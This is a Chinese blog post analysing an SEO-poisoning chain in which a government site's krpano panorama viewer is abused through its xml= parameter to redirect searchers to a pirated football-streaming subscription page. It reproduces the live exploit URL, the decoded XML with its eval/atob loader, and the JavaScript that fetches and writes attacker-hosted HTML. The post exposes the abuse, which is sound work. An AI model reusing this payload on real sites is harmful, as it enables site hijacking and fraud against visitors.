---
title: SEO分析
date: 2026-11-09 16:15:00
categories: 技术
tags:
- 网络安全
- 研究
- 技术
---

今天在Google搜索 "reddit"，在搜索结果的第2页，看到一个政府网站的链接，标题竟然是“LIVE TWENTE VS AJAX FOOTBALL LIVE FREE REDDIT”，点击之后，跳转到了足球比赛的直播页面。需要充值才能观看。

下面是对这个流程的完整分析（借助AI）

# SEO分析

在Google搜索 "reddit"，在搜索结果的第2页，看到一个政府网站的链接。如图：

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/20261109-155105.jpg)

完整的链接如下：
```
https://data.cqna.gov.cn/vr/jiedao/ns/tour.html?xml=data:video/mp4;base64,PGtycGFubz48aW5jbHVkZSB1cmw9Ii9cL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvYS54bWwiLz48L2tycGFubz4=&id=video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv
```


![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/twete_vs_ajax.png)


在AI的帮助下，对链接进行分析：


![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-16-19-37.png)


对链接中的

```
PGtycGFubz48aW5jbHVkZSB1cmw9Ii9cL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvYS54bWwiLz48L2tycGFubz4=
```

base64解码后
```
<krpano><include url="/\/juntestacccount.github.io/news/bspn/test/a.xml"/></krpano>
```

XML的内容：
```
<krpano version="1.0.8.15">
<script src="chrome-extension://ofaokhiedipichpaobibbnahnkdoiiah/src/frames_handler.js"/>
<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CmZldGNoKCJodHRwczovL2p1bnRlc3RhY2Njb3VudC5naXRodWIuaW8vbmV3cy9ic3BuL3Rlc3QvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpLAogICAgZG9jdW1lbnQud3JpdGUoZSksCiAgICBkb2N1bWVudC5jbG9zZSgpCiAgfSk7');eval(w)););"/>
</krpano>

```

对 atob中的内容进行解码：

```
var id = new URLSearchParams(location.search).get("id") || "alcazar_arquitectonico";
fetch("https://juntestacccount.github.io/news/bspn/test/" + id + ".html")
  .then(e => e.text())
  .then(e => {
    document.open(),
    document.write(e),
    document.close()
  });
```

`eval(w)` 执行上面的代码，将 id 替换为 `id=video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv`，

完整的链接如下：

```
https://juntestacccount.github.io/news/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html
```

用户点击Google搜索结果之后会执行代码，跳转到 https://juntestacccount.github.io/news/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html ，然后浏览器会加载这个页面。

页面代码： https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html

最后跳转到目标网站：https://streamespn.org/soccer/dutch-eredivisie/twente-vs-ajax-2026-11-08-13-30?alpha


https://trusthubmedia.com/app/signup/soccer

---

用AI对html代码进行分析，

---

# AI分析报告

> 代码： https://github.com/juntestacccount/news/blob/main/bspn/test/video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv.html

我在静态读取你上传的文件，没有执行任何代码。已经查完，下面是结论。

这个 HTML 本身不含跳转代码，只有**两处**不属于 Sky Sports 原模板的东西。

**1. 第 18 行：外部跳转脚本（核心）**
```html
<script src="https://akmistao.site/js/alpha-dutch.js"></script>
```
这是整个文件里**唯一**一个写死在 HTML 里的外部 `<script src>`。我按以下关键词搜了全文：`eval(`、`atob(`、`unescape(`、`fromCharCode`、`document.write`、`location.href/replace/assign`、`window.location`，**没有任何命中**。也没有 `<meta http-equiv="refresh">`。所以页面里能触发跳转的入口，只有这一行。

**2. 第 1603 行：访问统计像素**
```html
<img src="//sstatic1.histats.com/0.gif?5050800&101"/>
```
这是 Histats（免费访客统计服务）的计数图，`5050800` 是统计账号 ID。它在 Sky 原模板里不存在，是攻击者加的，用来统计每个垃圾页吸引了多少访客。这个 ID 对举报有用，Histats 可以据此定位到账号。

## 其余内容是什么

整个文件约 1600 行、124 KB，其余都是复制的 Sky Sports 页面：

- 导航、页脚、登录模板、Adobe / Google Analytics / Qualtrics / DotMetrics / Covatic 等脚本，全是 Sky 自己的。
- 这些脚本里很多用的是相对路径（如 `/js/modules-es6/...`、`/css/...`），放在 github.io 上会 404，页面样式和功能其实是坏的。攻击者不在乎，因为这个页面主要给搜索引擎爬虫看的，真人访客一般在样式加载前就被脚本带走了。
- 标题、正文、"Watch Next" 里的 11 条标题全被替换成 "LIVE Twente vs Ajax Football Live fRee Reddit"，图片统一指向同一张 shutterstock 缩略图。这是典型的关键词堆砌。
- 结构化数据里的发布日期是 2026-11-11（比今天还晚两天），`mainEntityOfPage` 指向一篇无关的 Man Utd 文章，都是造假和模板残留。

## 完整链路

```
Google 搜索结果
  → data.cqna.gov.cn（krpano 的 xml= 参数被滥用）
  → 加载 juntestacccount.github.io 的 a.xml（里面的 JS 再去拉 <id>.html）
  → 这个仿冒 Sky Sports 页面
  → 第 18 行加载 akmistao.site/js/alpha-dutch.js
  → 跳转到 streamespn.org/soccer/dutch-eredivisie/...?alpha
```

## 还没验证的部分

`alpha-dutch.js` 的内容我这边读不到，所以**它具体怎么拼出最终地址、有没有条件判断（比如只对来自 Google 的访客跳转）**，目前只是推断。你可以用之前给的 curl 命令下载后贴给我。

---

# 在页面点击视频后，会跳转到目标网站

链接是：https://trusthubmedia.com/app/aff/go/1xl-DJTBpEEB2J?i=1

目标网站是： https://trusthubmedia.com/app/signup/soccer

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-17-18-09.png)



## 用AI继续分析

这张截图很关键，它说明那份 AI 报告对这个网站的定性有偏差。

## 报告错在哪里

报告把 TrustHubMedia 说成"开放资源聚合的信息中介"，依据主要是 About Us 页面和用户协议。但注册页上写得很清楚，它卖的是**盗版足球赛事直播会员**：

- 页面标题：Soccer Events Live Stream Online
- 产品名：Soccer Game Pass，卖点是 "Full Access of Soccer and All Sports Event Online"
- 收款方式：只有信用卡

"帮用户搜索互联网上的 Open Source Data"更像一层法律包装，让网站在声明上显得不是直接提供内容。这是我的推断，但它与产品页的实际用途明显不符。

## 报告里的具体数据和截图对不上

| 项目 | 报告里写的 | 实际注册页 |
|---|---|---|
| 套餐 | 15 天 / 30 天 / 365 天 | 7 天 $4.99、月付 $19.99、周付 $9.99 |
| 年度会员 | 有 | 没有 |
| 报告里的示例价格 | $5 / $10 / $60 | 纯属虚构，与真实价格无关 |

截图里的定价本身也有矛盾：

- "7 Days $4.99" 和 "Weekly $9.99" 时长相同，价格差一倍。
- 周付套餐的说明写着 "Full Season Access"，周卡不可能有整个赛季的权限。

这种页面看起来像是用模板拼出来的，用 $4.99 的低价钩子吸引人下单。报告说协议里有 Trial 和 Rebill（续费）条款，如果属实，$4.99 的首单很可能自动续成更贵的套餐。这一点需要对照条款原文确认。

## 它和你前面查的链路怎么连上

完整链路现在是：

```
Google 搜索垃圾结果
  → 被黑的政府站 krpano 漏洞
  → GitHub 仿冒 Sky Sports 页面
  → akmistao.site 跳转脚本
  → streamespn.org/...?alpha
  → TrustHubMedia 注册页（刷卡订阅）
```

前面那一大串劫持、SEO 投毒、重定向，都是**为这个收款页面免费获客**。报告里引用的流量数据（引荐占约 64%、搜索仅约 0.08%）与这个解释吻合：落地站的访客大多是被别的站点转来的。不过那是第三方历史估算，只能当旁证。

另外，报告提到网站有 Affiliate 联盟系统。`?alpha` 这个参数有可能就是联盟或渠道标记。这只是推测，目前没有证据证明 TrustHubMedia 的运营方本人指使了政府站劫持，也可能是某个推广者自己在刷流量。要验证的话，可以观察跳到 TrustHub 时 URL 里带的参数（比如 `aff`、`ref`、`utm`），这些参数会指向具体的推广者账号。


## 一句话总结

这是一条**用黑帽 SEO 免费获客、最终卖盗版足球直播会员**的灰色产业链。前面的劫持、跳转都是引流手段，真正赚钱的是末端的刷卡订阅页。

## 完整流程

```
① 用户在 Google 搜 "reddit" 等热词
② 结果里出现 "LIVE Twente vs Ajax ... Free Reddit"（挂在 .gov.cn 等高权重域名下）
③ 点击后进入被滥用的政府站 krpano 页面（xml= 参数加载外部配置）
④ 加载 GitHub Pages 上的 a.xml，再按 id 拉取对应的仿冒页面
⑤ 仿冒 Sky Sports 页面（只给搜索引擎看，用来做关键词排名）
⑥ 页面里的 akmistao.site/js/alpha-dutch.js 把访客带走
⑦ streamespn.org 盗版直播站（带 ?alpha 渠道标记）
⑧ TrustHubMedia 注册页：$4.99 / $9.99 / $19.99 的 Soccer Game Pass，信用卡支付

```

## 各环节的作用

| 环节 | 作用 |
|---|---|
| 被黑的政府/高校站点 | 借高权重域名让垃圾页排上 Google 前列 |
| GitHub Pages | 免费托管成千上万个关键词页面，每个 id 对应一个热门赛事 |
| 仿冒 Sky Sports 页面 | 给爬虫看的内容壳，堆关键词 |
| akmistao.site 脚本 | 集中控制跳转目标，换终点只需改一个文件 |
| streamespn.org | 中转落地站，同时承接直播类关键词流量 |
| TrustHubMedia | 收款端，靠会员订阅变现 |

## 商业模式本质

- **获客成本接近零**：流量来自被劫持的第三方域名和免费托管，不用买广告。
- **变现靠低价订阅**：$4.99 首单做钩子，条款里有试用和续费（Rebill）机制，真实的续费规则需要看条款原文才能确认。
- **用"资源聚合"做法律包装**：网站声明自己只是帮用户搜索公开资源，规避直接提供盗版内容的责任。
- **可能有联盟分成**：注册页和 `?alpha` 参数显示存在渠道标记，不排除是推广者在刷流量，这一点只是推测，没有证据证明运营方指使了劫持。


```
① 批量生成"赛事 + live + free + reddit"页面
   每场比赛一个 id，如 video-live-twente-vs-ajax-football-live-free-reddit-liv-en-tv

② 借高权重域名挂页面
   利用政府站 data.cqna.gov.cn 的 krpano 页面漏洞（xml= 参数可加载外部配置），
   让 .gov.cn 域名"长出"这些垃圾页，借它的权重冲 Google 排名

③ 外部页面托管在 GitHub Pages
   a.xml 里的 JS 按 id 去 juntestacccount.github.io 拉取对应 html，
   页面是仿冒的 Sky Sports 模板，标题和关键词全改成赛事词，专门给爬虫看

④ 真人点击后被带走
   页面里 akmistao.site/js/alpha-dutch.js 负责跳转（脚本名里的 dutch 对应荷甲）

⑤ 中转站 streamespn.org
   URL 形如 /soccer/dutch-eredivisie/twente-vs-ajax-2026-11-08-13-30?alpha

⑥ 收款页 TrustHubMedia
   Soccer Game Pass 会员，$4.99 / $9.99 / $19.99，信用卡（据你说是 Stripe）支付
```


# krpano 漏洞说明

我先查一下这个漏洞的官方信息，避免凭记忆说错。

## 漏洞是什么

**krpano** 是一款做全景图和 VR 漫游的播放器，很多政府、高校、企业网站的"全景导览"页面都在用。你遇到的问题是它的一个**反射型 XSS（跨站脚本）漏洞**，核心在 URL 里的 `xml=` 参数。

原理很简单：
- `https://data.cqna.gov.cn/vr/jiedao/ns/tour.html` 这个页面是政府站 data.cqna.gov.cn 的一个全景导览页面，用 krpano 播放。
 - krpano 页面的配置是 XML 文件，正常情况下由网站自己指定。
- 如果网站设置允许通过 URL 的 `xml=` 参数传入配置，攻击者就可以构造链接，让页面加载**他指定的内容**。
- 你最初那条链接里 `xml=data:video/mp4;base64,...` 就是这么做的：用 `data:` URL 把一段 Base64 编码的 XML 直接塞进参数里，再让它去 include 攻击者 GitHub 上的文件。
- krpano 的 XML 能调用 JavaScript，所以最终等于**在政府网站的域名下执行攻击者的脚本**。

## 公开记录

- 2020 年就有相关漏洞披露：krpano 1.20.8 及以前版本的默认安装存在反射型 XSS，原因是 /viewer/krpano.html 对 xml 参数的外部 XML 加载不安全（CVE-2020-24900）。
- 官方当时的修补并不彻底。SecurityWeek 报道称，这个缺陷自 2020 年就为人所知（CVE-2020-24901），开发者当时加了一些限制，但补丁不完整，影响也被低估。
- 2025 年又有新编号：1.23.1 及以前版本在 passQueryParameters 函数中，因 xml 参数处理不当导致 XSS（CVE-2025-65892），升级到 1.23.2 可以消除。
- krpano 作者的说法是：自 2021 年 9 月的 1.20.10 起，所有版本默认都把 passQueryParameters 设为关闭或无害值，正常情况下不该再受 XSS 影响，只有显式允许 xml 通过查询参数传入时才有风险，而这种配置很罕见。

## 和你这个案例的关系

SecurityWeek 报道的就是同一类手法：攻击者利用这个 XSS，把访客从大机构网站的页面重定向到任意域名，并用 SEO 投毒引流，目的地包括成人内容、赌场、黑客服务等可疑站点。你看到的"政府站 → 跳转 → 盗版直播"是同一套打法，只是换成了体育赛事关键词。


# 进一步排查

在Google搜索 `site:data.cqna.gov.cn live`，返现大量类似的SEO投毒链接

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-18-02-48.png)

![](https://raw.githubusercontent.com/youngqqcn/repo4picgo/master/img/2026-11-09-18-05-02.png)